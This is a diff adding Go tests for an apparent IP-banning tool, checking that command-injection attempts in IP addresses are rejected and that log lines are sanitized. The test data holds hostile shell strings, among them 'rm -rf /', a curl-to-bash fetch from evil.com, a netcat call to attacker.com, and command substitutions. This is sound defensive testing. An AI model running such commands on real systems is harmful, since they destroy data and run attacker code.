@@ -100,3 +100,97 @@ func TestActionNoAction(t *testing.T) {
 	action.Handle(ctx)
 	assert.False(t, ctx.Actioned, "Context should not be marked as actioned")
 }
+
+// TestCommandInjectionPrevention verifies that malicious IPs cannot inject commands
+func TestCommandInjectionPrevention(t *testing.T) {
+	maliciousIPs := []string{
+		"192.168.1.1; rm -rf /",
+		"192.168.1.1 && curl http://evil.com/malware.sh | bash",
+		"192.168.1.1 | nc attacker.com 1234",
+		"192.168.1.1`whoami`",
+		"192.168.1.1$(whoami)",
+		"192.168.1.1 > /etc/passwd",
+		"192.168.1.1(); echo pwned",
+		"192.168.1.1{}[]",
+	}
+
+	action := &Action{
+		name:    "test",
+		command: "echo 'banning $ip'",
+	}
+
+	for _, maliciousIP := range maliciousIPs {
+		t.Run(maliciousIP, func(t *testing.T) {
+			ctx := &scan.Context{
+				IP:     maliciousIP,
+				Action: "test",
+				DryRun: false, // Test actual execution path
+			}
+
+			err := action.execute(ctx)
+			// Should return error for invalid IP
+			assert.Error(t, err, "Expected error for malicious IP: %s", maliciousIP)
+			assert.Contains(t, err.Error(), "invalid or dangerous IP address")
+		})
+	}
+}
+
+// TestValidIPExecution verifies that valid IPs can still execute actions
+func TestValidIPExecution(t *testing.T) {
+	validIPs := []string{
+		"192.168.1.1",
+		"10.0.0.1",
+		"172.16.0.1",
+		"8.8.8.8",
+		"2001:db8::1",
+		"::1",
+	}
+
+	action := &Action{
+		name:    "test",
+		command: "true", // Command that always succeeds
+	}
+
+	for _, validIP := range validIPs {
+		t.Run(validIP, func(t *testing.T) {
+			ctx := &scan.Context{
+				IP:          validIP,
+				Action:      "test",
+				DryRun:      false,
+				Line:        "test log line",
+				Filename:    "/var/log/test.log",
+				UnbanAction: "unban-test",
+				BanTime:     24,
+			}
+
+			err := action.execute(ctx)
+			// Should succeed for valid IP
+			assert.NoError(t, err, "Expected no error for valid IP: %s", validIP)
+		})
+	}
+}
+
+// TestEnvironmentVariableSanitization verifies env vars are sanitized
+func TestEnvironmentVariableSanitization(t *testing.T) {
+	action := &Action{
+		name:    "test",
+		command: "printenv SB_LINE",
+	}
+
+	maliciousLine := "test line\nrm -rf /\x00evil"
+
+	ctx := &scan.Context{
+		IP:          "192.168.1.1",
+		Action:      "test",
+		DryRun:      false,
+		Line:        maliciousLine,
+		Filename:    "/var/log/test.log",
+		UnbanAction: "test",
+		BanTime:     24,
+	}
+
+	// Should execute without error (sanitization removes dangerous chars)
+	err := action.execute(ctx)
+	assert.NoError(t, err)
+	// The malicious newline and null byte should have been removed by sanitization
+}
